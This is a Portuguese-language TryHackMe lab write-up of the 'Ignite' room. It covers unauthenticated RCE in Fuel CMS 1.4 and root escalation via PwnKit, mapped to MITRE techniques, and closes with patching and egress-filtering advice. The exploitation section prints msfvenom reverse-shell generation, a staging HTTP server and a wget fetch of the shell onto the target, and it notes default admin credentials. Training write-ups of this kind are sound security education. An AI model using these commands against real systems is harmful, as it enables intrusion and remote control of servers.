---
title: "TryHackMe Writeup: Ignite"
date: 2025-11-28
description: "Security assessment do Fuel CMS 1.4. RCE não autenticado e elevação de privilégio via CVE-2021-4034 (PwnKit)."
tags: ["tryhackme", "fuel-cms", "rce", "pwnkit", "mitre-attack"]
layout: "page"
showPagination: true
showDate: true
showReadingTime: true
showWordCount: true
showAuthorBottom: true
---

### Resumo Executivo

Avaliação técnica conduzida seguindo os padrões do NIST SP 800-115. O alvo, executando Fuel CMS 1.4, foi considerado vulnerável a Execução Remota de Código (RCE) não autenticada. O acesso inicial foi utilizado para realizar enumeração local, resultando no comprometimento total do sistema através do exploit PwnKit (CVE-2021-4034).

### Cadeia de Ataque (Mapeamento PTES)

#### 1. Pré-engajamento & Coleta de Informações
A varredura de rede identificou um servidor web executando o Fuel CMS versão 1.4.
```bash
sudo nmap -Pn -sS -sV -T4 -p- -O 10.65.143.81
```
* **Técnica MITRE:** [T1595](https://attack.mitre.org/techniques/T1595/) - Active Scanning.

#### 2. Análise de Vulnerabilidades
A aplicação foi identificada como Fuel CMS 1.4.1, versão conhecida por uma vulnerabilidade específica de RCE em seus parâmetros de filtragem. Credenciais padrão (`admin:admin`) também estavam presentes no painel do CMS.
* **Técnica MITRE:** [T1190](https://attack.mitre.org/techniques/T1190/) - Exploit Public-Facing Application.

#### 3. Exploração (Acesso Inicial)
Um reverse shell em PHP foi gerado e carregado via o vetor de RCE utilizando uma entrega em estágios (staged delivery):
```bash
# Lado do Atacante:
msfvenom -p php/reverse_php LHOST=<IP> LPORT=4444 -f raw > shell.php
python3 -m http.server 8000

# Lado do Alvo (via RCE):
wget http://<IP>:8000/shell.php -O /var/www/html/assets/shell.php
```
Um listener do Netcat capturou a conexão, fornecendo um shell como `www-data`.
* **Técnica MITRE:** [T1505.003](https://attack.mitre.org/techniques/T1505/003/) - Server Software Component: Web Shell.

#### 4. Pós-Exploração (Elevação de Privilégio)
A enumeração do sistema identificou que o host era vulnerável ao exploit PwnKit (CVE-2021-4034).
```bash
./PwnKit
whoami # root
```
* **Técnica MITRE:** [T1548.001](https://attack.mitre.org/techniques/T1548/001/) - Abuse Elevation Control Mechanism: Setuid and Setgid.

### Recomendações (NIST SP 800-115)

* **Gestão de Patches:** Atualizar o Fuel CMS para a versão segura mais recente e aplicar os patches de kernel/PolicyKit para mitigar o PwnKit.
* **Hardening de Configuração:** Alterar todas as credenciais administrativas padrão e restringir o acesso à interface de gerenciamento do CMS.
* **Filtragem de Saída (Egress):** Implementar regras estritas de firewall para prevenir conexões de saída não autorizadas (Reverse Shells).